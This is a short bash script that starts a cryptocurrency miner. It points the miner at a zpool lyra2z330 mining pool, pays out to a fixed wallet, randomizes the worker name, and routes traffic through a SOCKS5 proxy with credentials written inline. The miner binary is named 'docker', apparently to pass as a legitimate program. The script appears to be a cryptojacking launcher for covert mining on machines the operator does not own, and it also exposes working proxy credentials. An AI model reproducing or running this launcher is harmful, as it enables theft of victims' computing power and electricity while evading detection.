#!/bin/bash
POOL=stratum+tcp://lyra2z330.na.mine.zpool.ca:4563
WALLET=DQGAS3U8cmDwBPn61bboXNBrSkEWhXuaVT
PROXY=socks5://nwrrjrhq:6krfq9tv5jb9@45.57.199.103:7638
./docker -a lyra2z330 -o $POOL -u $WALLET.$(shuf -n 1 -i 1-9999999) -p c=DGB,zap=BUT-lyra2z330 -t 2 -x $PROXY
